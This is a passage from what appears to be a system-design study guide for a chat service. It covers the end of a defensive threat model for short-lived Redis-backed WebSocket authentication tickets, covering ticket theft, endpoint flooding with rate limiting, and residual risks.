Mitigation: Ticket is stored as `SET ws_ticket:{ticket_value} {user_id} EX 30`. At any moment, there are at most N valid tickets where N = (requests per second × 30s). At 10,000 logins/sec × 30s = 300,000 tickets. Attacker would need to use each within 30s and simultaneously. In practice, each ticket is used within milliseconds of issuance — by the time the attacker extracts it, it's been consumed.
Residual risk: If Redis is compromised AND the attacker can intercept the WS connection before the client (race condition), they could impersonate users. Monitoring Redis access patterns and network segmentation are the primary mitigations here.

**Threat 5: Denial of service (ticket endpoint flood)**
Attack: Attacker floods `POST /api/ws/ticket` to exhaust Redis ticket storage.
Mitigation: Rate limiting on the ticket endpoint (10 tickets/minute/user). Each ticket is 32 bytes + metadata → 1 million tickets = 32MB of Redis memory — negligible. The real limit is the rate limit, not storage.

**Residual risks that cannot be eliminated:**
- Device compromise (malware, malicious extensions) — outside server-side scope
- Social engineering (attacker tricks user into scanning QR code that is actually a ticket)
- Side-channel attacks on the CSPRNG (theoretical, not practical)
- Legal compulsion (government requiring server-side access) — resolved with E2EE, not ticket design

**Overall assessment:** The short-lived ticket approach is the best practical design for WebSocket authentication given the browser API constraints. Residual risks are either theoretical or require device-level compromise, which would compromise the session regardless of authentication mechanism.

---

*Document ends. Coverage: full message lifecycle, network stack, WebSocket protocol internals, distributed fanout, PostgreSQL schema and partitioning, Redis usage patterns, 6 attack scenarios, scaling to 1B messages/day, E2EE design, 12 interview questions with why/what-if variants.*
